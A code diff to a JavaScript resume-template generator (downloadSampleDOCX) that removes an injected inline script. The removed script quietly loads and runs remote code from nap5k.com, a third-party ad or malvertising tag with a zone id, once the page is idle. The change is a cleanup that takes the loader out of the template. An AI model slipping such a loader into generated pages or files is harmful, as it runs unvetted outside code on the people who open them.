@@ -723,8 +723,7 @@ function downloadSampleDOCX(templateId){
     <hr>
     <div class="section">SKILLS</div>
     <div class="text">${t.sampleSkills}</div>
-  <script>(function(){function m(){(function(s){s.dataset.zone='11682125',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))}if('requestIdleCallback' in window)requestIdleCallback(m);else if(document.readyState!=='loading')m();else window.addEventListener('load',m)})()</script>
-</body></html>`;
+  </body></html>`;
   const blob = new Blob([content], {type:'application/msword'});
   const url = URL.createObjectURL(blob);
   const a = document.createElement('a');
